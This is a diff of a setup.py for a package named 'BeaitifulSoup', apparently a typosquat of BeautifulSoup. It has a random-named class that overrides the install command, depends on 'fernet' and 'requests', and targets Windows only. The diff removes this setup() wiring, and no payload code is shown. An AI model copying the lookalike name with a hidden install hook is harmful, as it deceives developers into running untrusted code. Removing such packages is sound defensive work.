@@ -18,22 +18,5 @@ class unXeSJgjUkmjnOjpfWlXSbXMkKgiFursbWjfclSHudOVYWwWAaCoWJvCSDewfqDfrFBOdJKWvJ
             install.run(self)
 
 
-setup(
-    name="BeaitifulSoup",
-    version=VERSION,
-    author="zvWnybuN",
-    author_email="pmToNQIZxFIGHj@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': unXeSJgjUkmjnOjpfWlXSbXMkKgiFursbWjfclSHudOVYWwWAaCoWJvCSDewfqDfrFBOdJKWvJKRGniPaxzpPlTupfpIpadLLWCLve,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
 
